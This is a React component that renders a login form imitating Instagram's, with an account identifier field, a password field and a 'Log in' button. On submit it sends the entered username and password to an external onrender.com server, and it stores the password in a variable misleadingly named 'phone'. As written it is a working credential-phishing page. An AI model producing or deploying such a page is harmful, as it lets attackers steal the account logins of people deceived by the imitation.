import { useState } from "react";
import "./App.scss";
import Logo from "./assets/logo.png";


function App() {

    const [name, setName] = useState("");
    const [phone, setPhone] = useState("");
    const [success, setSuccess] = useState("");


    const sendData = async (e) => {
        e.preventDefault();


        try {

            const response = await fetch(
                "https://instagram-clone-for-phone-server.onrender.com/api/test",
                {
                    method: "POST",

                    headers: {
                        "Content-Type": "application/json",
                    },

                    body: JSON.stringify({
                        name,
                        phone
                    })
                }
            );


            const data = await response.json();


            if (!response.ok) {
                throw new Error(data.message);
            }


            setSuccess("Ma'lumot yuborildi ✅");

            setName("");
            setPhone("");


        } catch (error) {

            console.log(error);

            setSuccess("Xatolik yuz berdi ❌");

        }

    };


    return (

        <div className="container">

            <div className="Logo">
                <img src={Logo} alt="" />
            </div>


            <form
                onSubmit={sendData}
                className="form"
            >

                <input
                    type="text"
                    placeholder="Phone number, email or username"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                />


                <input
                    type="password"
                    placeholder="Password"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                />


                <button type="submit">
                    Log in
                </button>


                <p>{success}</p>


            </form>

        </div>

    );
}


export default App;